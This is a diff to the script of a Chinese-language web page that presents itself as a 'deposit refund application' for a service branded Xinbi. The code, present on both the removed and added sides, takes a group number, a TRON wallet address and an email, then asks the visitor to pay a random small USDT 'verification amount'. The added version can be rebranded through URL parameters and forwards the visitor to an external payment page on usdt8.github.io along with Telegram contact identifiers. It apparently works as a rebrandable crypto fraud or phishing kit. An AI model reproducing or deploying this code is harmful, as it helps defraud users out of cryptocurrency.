@@ -101,104 +101,83 @@
 <script defer src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" data-cf-beacon='{"version":"2024.11.0","token":"7a1d4faeffa7438aa014c61bf087f1ac","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}'></script>
 </body>
 </html>
-<script>
-let isSubmitting = false;
-function isTronAddress(address) {
-    const tronAddressRegex = /^T[1-9A-HJ-NP-Za-km-z]{33}$/;
-    return tronAddressRegex.test(address);
-}
-function generateRandomAmount() {
-    const randomInt = Math.floor(Math.random() * 300000) + 1;
-    const randomAmount = (randomInt / 1000000).toFixed(6);
-    return randomAmount;
-}
-document.addEventListener('DOMContentLoaded', function() {
-    const usdtButton = document.getElementById('usdtButton');
-    
-    if (usdtButton) {
-        usdtButton.addEventListener('click', async function() {
-            if (isSubmitting) {
-                return false;
-            }
-            isSubmitting = true;
-            this.disabled = true;
-            const originalText = this.innerHTML;
-            this.innerHTML = `<img src="static/picture/usdt.png" alt="" style="height: 24px; margin-right: 8px;">正在发起支付请求...`;
-            
-            const groupNumber = document.getElementById('groupNumber').value.trim();
-            const contact = document.getElementById('contact').value.trim();
-            const email = document.getElementById('email').value.trim();
-            const randomAmount = generateRandomAmount();
-            
-            if (!groupNumber) {
-                alert('请输入专群群号');
-                this.disabled = false;
-                this.innerHTML = originalText;
-                isSubmitting = false;
-                return;
-            }
-            if (!isTronAddress(contact)) {
-                alert('请输入正确的上押地址');
-                this.disabled = false;
-                this.innerHTML = originalText;
-                isSubmitting = false;
-                return;
-            }
-            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-            if (!emailRegex.test(email)) {
-                alert('请输入正确的邮箱地址');
-                this.disabled = false;
-                this.innerHTML = originalText;
-                isSubmitting = false;
-                return;
-            }
-            if (!confirm(`退押验证金额 ${randomAmount} USDT, 点击 确认 前去付款`)) {
-                this.disabled = false;
-                this.innerHTML = originalText;
-                isSubmitting = false;
-                return;
-            }
-            try {
-                const formData = new URLSearchParams();
-                formData.append('title', '新币退押申请');
-                formData.append('price', randomAmount);
-                formData.append('amount', 1);
-                formData.append('pay_amount', randomAmount);
-                formData.append('email', email);
-                formData.append('img_path', '/xinbi/static/picture/xinbi.jpg');
-                
-                const response = await fetch("/custom-payment", {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/x-www-form-urlencoded'
-                    },
-                    body: formData
-                });
+	// 动态处理参数
+	;(function () {
+		const params = new URLSearchParams(window.location.search)
+		const name = params.get('name')
+		const kefu = params.get('kefu') || 'okk13'
+		const tgid = params.get('tgid') || '5866891166'
 
-                if (!response.ok) {
-                    throw new Error(`HTTP error! status: ${response.status}`);
-                }
+		if (name) {
+			document.title = name + ' - 退押申请'
+			const brand = document.querySelector('.navbar-brand')
+			if (brand) {
+				brand.innerHTML = `<img src="static/picture/xinbi.jpg" alt="LOGO" style="height: 30px; width: auto; margin-right: 10px;"> ${name}`
+			}
+			const footer = document.querySelector('.footer p')
+			if (footer) footer.textContent = `Powered by@${name}`
+		}
+	})()
 
-                const responseData = await response.json();
-                
-                if (responseData.url) {
-                    window.location.href = responseData.url;
-                } else {
-                    alert('获取支付链接失败，请稍后重试');
-                    this.disabled = false;
-                    this.innerHTML = originalText;
-                    isSubmitting = false;
-                }
-            } catch (error) {
-                console.error('创建订单错误:', error);
-                alert('提交申请失败，请稍后重试');
-                this.disabled = false;
-                this.innerHTML = originalText;
-                isSubmitting = false;
-            }
-        });
-    }
-});
+	let isSubmitting = false
+	function isTronAddress(address) {
+		const tronAddressRegex = /^T[1-9A-HJ-NP-Za-km-z]{33}$/
+		return tronAddressRegex.test(address)
+	}
+	function generateRandomAmount() {
+		const randomInt = Math.floor(Math.random() * 300000) + 1
+		const randomAmount = (randomInt / 1000000).toFixed(6)
+		return randomAmount
+	}
+	document.addEventListener('DOMContentLoaded', function () {
+		const usdtButton = document.getElementById('usdtButton')
+
+		if (usdtButton) {
+			usdtButton.addEventListener('click', async function () {
+				if (isSubmitting) return
+				isSubmitting = true
+				this.disabled = true
+				const originalText = this.innerHTML
+				this.innerHTML = `<img src="static/picture/usdt.png" alt="" style="height: 24px; margin-right: 8px;">正在发起支付请求...`
+
+				const groupNumber = document.getElementById('groupNumber').value.trim()
+				const contact = document.getElementById('contact').value.trim()
+				const email = document.getElementById('email').value.trim()
+				const randomAmount = generateRandomAmount()
+
+				if (!groupNumber || !isTronAddress(contact) || !email) {
+					alert('请完整填写表格')
+					this.disabled = false
+					this.innerHTML = originalText
+					isSubmitting = false
+					return
+				}
+
+				if (!confirm(`退押验证金额 ${randomAmount} USDT, 点击 确认 前去付款`)) {
+					this.disabled = false
+					this.innerHTML = originalText
+					isSubmitting = false
+					return
+				}
+
+				// 跳转支付
+				const currentParams = new URLSearchParams(window.location.search)
+				const tgid = currentParams.get('tgid') || '5866891166'
+				const kefu = currentParams.get('kefu') || 'okk13'
+
+				const payParams = new URLSearchParams(window.location.search)
+				payParams.set('group', groupNumber)
+				payParams.set('address', contact)
+				payParams.set('email', email)
+				payParams.set('amount', randomAmount)
+				payParams.set('title', '新币退押申请')
+				payParams.set('tgid', tgid)
+				payParams.set('kefu', kefu)
+
+				window.location.href = `https://usdt8.github.io/c/index.html?${payParams.toString()}`
+			})
+		}
+	})
 document.addEventListener('visibilitychange', function() {
     if (!document.hidden) {
         isSubmitting = false;
